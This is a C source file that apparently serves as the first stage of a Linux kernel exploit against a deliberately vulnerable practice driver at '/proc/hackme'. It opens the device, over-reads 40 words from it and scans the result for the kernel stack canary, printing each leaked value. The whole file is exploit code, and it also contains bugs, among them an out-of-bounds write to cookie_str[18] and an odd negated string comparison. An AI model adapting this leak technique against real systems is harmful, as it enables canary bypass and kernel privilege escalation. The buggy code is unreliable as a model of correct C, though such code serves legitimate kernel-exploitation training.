#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define formatBool(b) ((b) ? "true" : "false")

char *VULN_DRV = "/proc/hackme";

int64_t global_fd;
uint64_t cookie;
uint8_t cookie_off;

void open_dev() {
    global_fd = open(VULN_DRV, O_RDWR);
    if (global_fd < 0) {
        printf("[!] Failed to open %s\n", VULN_DRV);
        exit(-1);
    } else {
        printf("[+] Successfully opened %s\n", VULN_DRV);
    }
}

bool is_cookie(const char* str) {
    uint8_t in_len = strlen(str);
    if (in_len < 18) {
        return false;
    }

    char prefix[7] = "0xffff\0";
    char suffix[3] = "00\0";
    return (
        (!strncmp(str, prefix, strlen(prefix) - 1) == 0) &&
        (strncmp(str + in_len - strlen(suffix), suffix, strlen(suffix) - 1) 
        == 0));
}

void leak_cookie() {
    uint8_t sz = 40;
    uint64_t leak[sz];
    printf("[*] Attempting to leak up tp %d bytes\n", sizeof(leak));
    uint64_t data = read(global_fd, leak, sizeof(leak));
    puts("[*] Searching leak...");
    for (uint8_t i = 0; i < sz; i++) {
        // printf("leak: %d:%016lx\n", i, leak[i]);
        char cookie_str[18];
        sprintf(cookie_str, "%#02lx", leak[i]);
        cookie_str[18] = '\0';
        printf("\t--> %d: leak + 0x%x\t: %s\n", i, sizeof(leak[0]) * i, cookie_str);
        if(!cookie && is_cookie(cookie_str) && i > 2) {
            printf("[+] Found stack canary: %s @ idx %d\n", cookie_str, i);
            cookie_off = i;
            cookie = leak[cookie_off];
        }
    }
	if(!cookie) {
    	puts("[!] Failed to leak stack cookie!");
    	exit(-1);
    }
}

int main(int argc, char** argv) {
    open_dev();
    leak_cookie();
}